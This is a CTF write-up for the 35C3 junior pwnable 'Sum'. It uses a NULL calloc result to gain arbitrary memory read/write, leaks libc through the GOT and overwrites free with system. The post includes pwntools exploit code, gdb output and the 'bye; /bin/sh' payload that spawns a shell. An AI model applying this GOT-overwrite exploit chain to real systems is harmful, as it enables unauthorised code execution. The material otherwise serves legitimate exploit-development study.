---
layout: post
author: X3eRo0
--- 
# Challenge: Sum(for 143 points)


                                            Abs0lut3Pwn4g3

<pre id="user-content-taag_output_text">
           _____ _________________                 __            _               __________________
          |__  // ____/ ____/__  /                / /_  ______  (_)___  _____   / ____/_  __/ ____/
           /_ &lt;/___ \/ /     /_ &lt;   ______   __  / / / / / __ \/ / __ \/ ___/  / /     / / / /_    
         ___/ /___/ / /___ ___/ /  /_____/  / /_/ / /_/ / / / / / /_/ / /     / /___  / / / __/    
        /____/_____/\____//____/            \____/\__,_/_/ /_/_/\____/_/      \____/ /_/ /_/       
</pre>
              
              
                                          **143 Points - PWNABLE**
                                          
**Challenge Description**:
 

                                        Sum it up!
                                        nc 35.207.132.47 22226
                                        Difficulty estimate: easy
              


We Are Given a zip file to Download - [ZIP](https://github.com/X3eRo0/X3eRo0.github.io/raw/master/sum-b22202e31d8d84ec55a8f7cb698e2d656622f806.zip). upon extracting we get the actuall binary and libc used on the server. 
So lets try to Execute the binary and see what it does.
```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_143  
╰─$ ./sum
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
> 2
Allocated space for 2 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set <x> <d>
    Set the x-th value to d
[2] get <x>
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set <x> <d>
[2] get <x>
[3] sum
[4] bye

> 
```

So basically it asks us for how many values you want to add up which gives us a hint that maybe its allocating space for that many values. so, i tried to mess around with it, and just after some time i entered a magical value of negative 1.
which gave me a segmentation fault on proceeding with the menu. which is good for us. also we can see that in the menu we have 2 main options of setting **x**-th value in allocated space to **d**, and similarly fetching a value at **x**-th index.

so lets try to enter -1 in the prompt where it asks us how many values to sum.

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ ./sum
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
> -1
Allocated space for 18446744073709551615 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set <x> <d>
    Set the x-th value to d
[2] get <x>
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set <x> <d>
[2] get <x>
[3] sum
[4] bye

> set 5000 50
[1]    7880 segmentation fault (core dumped)  ./sum
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ 
```

and here is the output of dmesg

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ dmesg | tail -n 1
[ 3390.576740] sum[7880]: segfault at 9c40 ip 0000000000400ac3 sp 00007fffd29d0d40 error 6 in sum[400000+2000]
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ 
```

the Segmentation Fault occured at Instruction Pointer : 0x0400ac3
so lets fire up gdb and look what happened.

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ gdb ./sum
GNU gdb (Ubuntu 8.2-0ubuntu1~18.04) 8.2
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
.........
.........
.........
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./sum...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum 
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
> -1
Allocated space for 18446744073709551615 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set <x> <d>
    Set the x-th value to d
[2] get <x>
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set <x> <d>
[2] get <x>
[3] sum
[4] bye

> set 5000 500

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x1388 
RBX: 0x7fffffffdc38 --> 0x603670 ("set 5000 500\n")
RCX: 0x0 
RDX: 0x1f4 
RSI: 0x0 
RDI: 0x7fffffffd5c0 --> 0x303035 ('500')
RBP: 0x7fffffffdc40 --> 0x78 ('x')
RSP: 0x7fffffffdc30 --> 0xffffffffffffffff 
RIP: 0x400ac3 (<calculator+493>:        mov    QWORD PTR [r12+rax*8],rdx)
R8 : 0x0 
R9 : 0x0 
R10: 0x7ffff7b82cc0 --> 0x2000200020002 
R11: 0x400c78 --> 0x6f207865646e4900 ('')
R12: 0x0 
R13: 0x400c95 --> 0x20656854006d7573 ('sum')
R14: 0x400caa --> 0x61766e4900657962 ('bye')
R15: 0x0
EFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ab4 <calculator+478>:   cmp    rax,QWORD PTR [rsp]
   0x400ab8 <calculator+482>:   jae    0x4009da <calculator+260>
   0x400abe <calculator+488>:   mov    rdx,QWORD PTR [rsp+0x20]
=> 0x400ac3 <calculator+493>:   mov    QWORD PTR [r12+rax*8],rdx
   0x400ac7 <calculator+497>:   jmp    0x400a54 <calculator+382>
   0x400ac9 <calculator+499>:   mov    rax,QWORD PTR [rsp+0x18]
   0x400ace <calculator+504>:   cmp    rax,QWORD PTR [rsp]
   0x400ad2 <calculator+508>:   jae    0x400af3 <calculator+541>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc30 --> 0xffffffffffffffff 
0008| 0x7fffffffdc38 --> 0x603670 ("set 5000 500\n")
0016| 0x7fffffffdc40 --> 0x78 ('x')
0024| 0x7fffffffdc48 --> 0x1388 
0032| 0x7fffffffdc50 --> 0x1f4 
0040| 0x7fffffffdc58 --> 0x8b364cb51f106b00 
0048| 0x7fffffffdc60 --> 0x0 
0056| 0x7fffffffdc68 --> 0x400bb0 (<__libc_csu_init>:   push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400ac3 in calculator ()
gdb-peda$ 
```
clearly Segmentation Fault Occured in the function calculator because of this statement
                        **mov    QWORD PTR [r12+rax*8],rdx**

value from rdx is stored at the address [r12+rax*8]
and if you debug the binary in gdb yourself, you will find that rax if the index value that we provide in "set 5000 50"
which means 5000 and rdx is the value we set to it which is 50 in this case

and if we look a little up in calculator()
we see what is r12

```
   0x000000000040098a <+180>:   call   0x400760 <calloc@plt>
   0x000000000040098f <+185>:   mov    r12,rax
```

when we input -1 calloc returns NULL or 0.so, r12 is 0 if we supply -ve values because you just cant allocate -ve space in memory.

so this statement just becomes 
                        **mov    QWORD PTR [rax*8],rdx**
                        
so the vulnerability is clear we have arbitrary read-write primitive.
but first lets try to **get** something from the binary, lets try to leak the address of puts from the binary
we will do that using pwntools. 
```
rom pwn import *
#context.log_level = "critical"
exe = ELF("./sum")
local = True
if local:
        p = process("./sum")
else:
        p = remote("52.15.72.79", 14012)

puts_got = exe.got.puts/8

p.sendlineafter("How many values to you want to sum up?\n> ", "-1")
p.recvuntil("\n> ")
p.sendline("get "+str(puts_got))
puts = int(p.recv(16))
log.info( "PUTS: "+hex(puts) )
```
what we do is simply get the got value of puts from binary and send to binary using "get" command and it will spit its value
we receive it and print it on screen. here is script in action.

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ python exploit.py
[*] '/home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './sum': pid 9146
[*] PUTS: 0x7fe5fe06e9c0
[*] Stopped process './sum' (pid 9146)
```

so we are able to leak the addresses, Now what do we do.
Remember we also have libc, we will use @niklasb's libc-database to find offsets to system()
here is how i did it. you could also use https://libc.blukat.me

```
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ ./identify libc-2.27.so 
id libc6_2.27-3ubuntu1_amd64
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ strings db/libc6_2.27-3ubuntu1_amd64.symbols | grep "puts "
_IO_puts 00000000000809c0
puts 00000000000809c0
fputs 000000000007f1f0
_IO_fputs 000000000007f1f0
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ strings db/libc6_2.27-3ubuntu1_amd64.symbols | grep "system "
__libc_system 000000000004f440
system 000000000004f440
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*›
╰─$ 
```

now we can calculate libc_base address by subtracting puts offset from libc from leaked puts address.

```
.....
.....
#libc offsets

offset_system = 0x04f440
offset_puts = 0x000809c0

libc_base = puts - offset_puts
log.info("LIBC BASE: "+hex(libc_base))

system = libc_base + offset_system
......
......
```

now what do we do with system() what do we overwrite, system would require an argument. how the hell do we spawn a shell?.
after short moment of rage, i decided to look back in the disassembled calculator() function.

and noticed something really weird thing.
after we are done with the program we can send "bye" command to exit from the binary.
when we send "bye" it calls free() and with argument as our input.
```
[----------------------------------registers-----------------------------------]
RAX: 0xffffff00 
RBX: 0x7fffffffdc38 --> 0x6036d0 --> 0xa3120000a657962 ('bye\n')
RCX: 0x0 
RDX: 0x6036d0 --> 0xa3120000a657962 ('bye\n')
RSI: 0x6036d3 --> 0xa3120000a ('\n')
RDI: 0x6036d0 --> 0xa3120000a657962 ('bye\n')
RBP: 0x7fffffffdc40 --> 0x78 ('x')
RSP: 0x7fffffffdc30 --> 0xa ('\n')
RIP: 0x400b41 (<calculator+619>:        call   0x400720 <free@plt>)
R8 : 0x0 
R9 : 0x7ffff7fc7500 (0x00007ffff7fc7500)
R10: 0x603260 ("bye\n9 1\n")
R11: 0x400c8e --> 0x7300757a25207465 ('et %zu')
R12: 0x603670 --> 0x0 
R13: 0x400c95 --> 0x20656854006d7573 ('sum')
R14: 0x400caa --> 0x61766e4900657962 ('bye')
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400b32 <calculator+604>:   mov    eax,0x0
   0x400b37 <calculator+609>:   call   0x400790 <__printf_chk@plt>
   0x400b3c <calculator+614>:   mov    rdi,QWORD PTR [rsp+0x8]
=> 0x400b41 <calculator+619>:   call   0x400720 <free@plt>    <================= call to free -----
   0x400b46 <calculator+624>:   mov    rax,QWORD PTR [rsp+0x28]                                    |
   0x400b4b <calculator+629>:   xor    rax,QWORD PTR fs:0x28                                       |
   0x400b54 <calculator+638>:   jne    0x400b6a <calculator+660>                                   |
   0x400b56 <calculator+640>:   add    rsp,0x30                                                    |
Guessed arguments:                                                                                 |
arg[0]: 0x6036d0 --> 0xa3120000a657962 ('bye\n')  <========================= arguments to free-----
```

you can see gdb-peda guessed the arguments passed to free() call shows that it points to the string we enter.



if we replace free() with system() and send "bye;/bin/sh"
insted of bye, we can get a shell. in then end thats what i did.

```
free = exe.got["free"]
p.sendline("set "+str(free/8)+" "+str(system))
p.recvuntil("\n> ")
p.sendline("bye; /bin/sh")
```

first we get address of free from got of binary, and then we set free's address devided by 8 because of this statement
                                **mov    QWORD PTR [rax*8],rdx**
where the given address is multiplied by 8.
and thats it we are done.

the final exploit looks like this.
```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ python exploit.py
[*] '/home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './sum': pid 9623
[*] PUTS: 0x7ff45ee4f9c0
[*] LIBC BASE: 0x7ff45edcf000
[*] system() : 0x7ff45ee1e440
[*] Switching to interactive mode
sh: 1: bye: not found
$ ls
exploit.py  libc-2.27.so  sum-b22202e31d8d84ec55a8f7cb698e2d656622f806.zip
flag.txt    sum
$ cat flag.txt
flag{ctf_is_over_so_this_is_a_local_exploit_from_X3eRo0}
$  

```

Thanks for reading that.
                                                                                                ~by [X3eRo0](https://twitter.com/X3eRo0)



               
               
